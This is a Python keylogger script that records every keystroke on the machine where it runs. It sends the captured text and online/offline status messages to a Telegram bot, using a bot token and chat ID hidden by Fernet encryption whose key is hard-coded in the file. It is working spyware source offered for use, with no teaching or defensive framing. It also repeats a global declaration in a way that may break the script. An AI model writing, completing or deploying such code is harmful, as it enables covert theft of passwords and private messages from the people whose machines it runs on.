import pynput
from pynput.keyboard import Key, Listener
import requests
import time
from cryptography.fernet import Fernet
import psutil  # To detect system uptime or specific processes
import os

# Encryption key (replace 'your_encryption_key_here' with the actual key you generated)
encryption_key = b'NCN6796UbF6GWB0eNbIuYJxxzF2bZmuo07cdF1Xa2JA='
cipher_suite = Fernet(encryption_key)

# Encrypted Telegram bot configuration (replace with your encrypted values)
encrypted_bot_token = b'gAAAAABnF-lpzhD4zFG-sZ8Tpvq0lhcbvXmbIMJGppQ26D8fPRPm6x2C_vKDn3S_Q0pW1a3aiVJpCcBY-doVG7JfB-cCnJz_jHsOzurENSxwy2TXX99_BSMqVGdwAuXCT2_Nog4AwTwg'  # Replace with your encrypted bot token
encrypted_chat_id = b'gAAAAABnF-lpBxhVtOsiV423qTDxbdVuEqeBAQtlhJ80ndFUHKTqI9I7uBXp6iHkdlUWYI1Q5NxsduZ5W8PHpgI4lpFsWyCXTA=='    # Replace with your encrypted chat ID

# Decrypt the bot token and chat ID at runtime
TELEGRAM_BOT_TOKEN = cipher_suite.decrypt(encrypted_bot_token).decode()
CHAT_ID = cipher_suite.decrypt(encrypted_chat_id).decode()

keys = []
SEND_INTERVAL = 60  # seconds to send messages
last_send_time = time.time()  # Initialize the last send time
status_sent = False  # Track if the online status was already sent

def send_status(status_message):
    """Send system status updates to Telegram (Online/Offline)."""
    url = f'https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage'
    data = {
        'chat_id': CHAT_ID,
        'text': status_message
    }
    requests.post(url, data=data)

def check_shutdown_restart():
    """Check for shutdown, restart, or sleep events."""
    # You can check system uptime to detect if the system recently rebooted
    uptime = time.time() - psutil.boot_time()
    if uptime < 300:  # If the system has been up for less than 5 minutes
        send_status("System has recently rebooted👀💻")

    # Alternatively, check for certain processes (like shutdown commands)
    for proc in psutil.process_iter(['pid', 'name']):
        if proc.info['name'] in ['shutdown', 'reboot']:
            send_status(f"Detected {proc.info['name']} command")
            return

def on_press(key):
    print(f"{key} pressed")
    global keys, status_sent
    keys.append(key)

    # Send 'online' status to the bot when the keylogger is active
    if not status_sent:
        send_status("😈Keylogger is online and working😎")
        status_sent = True

    # Check if enough time has passed or if the key is 'Enter'
    if (time.time() - last_send_time > SEND_INTERVAL) or (key == Key.enter):
        send_to_telegram(keys)
        keys.clear()  # Clear keys after sending

def send_to_telegram(keys):
    global last_send_time  # Declare as global here
    message = ""
    for key in keys:
        if key == Key.space:
            message += " "  # Add space character
        elif key == Key.enter:
            message += "\n"  # Add newline for Enter key
        elif key == Key.backspace:
            message += "[BACKSPACE]"  # Indicate backspace
        elif key == Key.tab:
            message += "[TAB]"  # Indicate tab
        elif key == Key.esc:
            message += "[ESC]"  # Indicate escape
        else:
            message += str(key).replace("'", "")  # Add other keys

    print(f"Sending: {message}")  # Print message for debugging
    
    # Send the keystroke to Telegram
    url = f'https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage'
    data = {
        'chat_id': CHAT_ID,
        'text': message
    }
    requests.post(url, data=data)

    # Update the last send time after sending the message
    global last_send_time
    last_send_time = time.time()

def on_release(key):
    if key == Key.esc:
        send_status("Keylogger is offline😥")
        return False  # Stop listener when Esc key is pressed

# Start the listener
if __name__ == "__main__":
    # Send a status update that the keylogger is online
    send_status("😈Keylogger started and is online😎")
    
    # Monitor shutdown, restart, or sleep events
    check_shutdown_restart()
    
    # Start listening to key events
    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()
